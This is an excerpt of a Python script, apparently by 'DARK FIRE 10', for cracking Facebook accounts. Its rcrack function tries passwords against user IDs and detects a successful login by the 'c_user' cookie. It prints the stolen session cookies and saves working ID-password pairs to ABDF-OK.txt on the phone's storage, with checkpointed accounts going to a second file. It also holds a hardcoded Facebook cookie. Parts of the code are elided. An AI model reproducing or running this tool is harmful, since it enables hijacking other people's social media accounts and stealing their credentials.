...
\33[1;91m╔════════════════════════════════════════╗
\33[1;92m║[•] Author    : FOYSAL AHAMMAD                   ║
\33[1;92m║[•] Facebook  : DARK FIRE 10               ║
\33[1;92m║[•] Whatsapp  : +***********            ║
\33[1;92m║[•] Github    : AB-DF10         ║
...
def rcrack(uid,pwx,tl):
    ...
    # 'cookie': 'datr=mARtZP-PCSoE16pWm73Hw8zS; sb=mARtZNf6huqMo0GUPeGV8zxC; m_pixel_ratio=1.46875; dnonce=AWm5rupijDHMeHdqEq-BcJKJlpXcRdA_LaTZmQEjG3Hr58_Iy0OroWl78ykmSxi50917yAkEp7szvI4NYXIIe0-5; wd=492x960; fr=0KlbvNEts4SoJYc7l..BkbQSY.a6.AAA.0.0.BkbYCW.AWWpNrB0in0',
    ...
    'upgrade-insecure-requests': '1',
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\r\033[1;32m[ABDF-OK💚] ' +uid+ ' | ' +ps+    '  \n[‎‎😍]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/ABDF-OK.txt', 'a').write( uid+' | '+ps+'\y')
                oks.append(uid)
                break
                ...
                open('/sdcard/ABDF-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\r%s{x}[{xr}ABDF{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
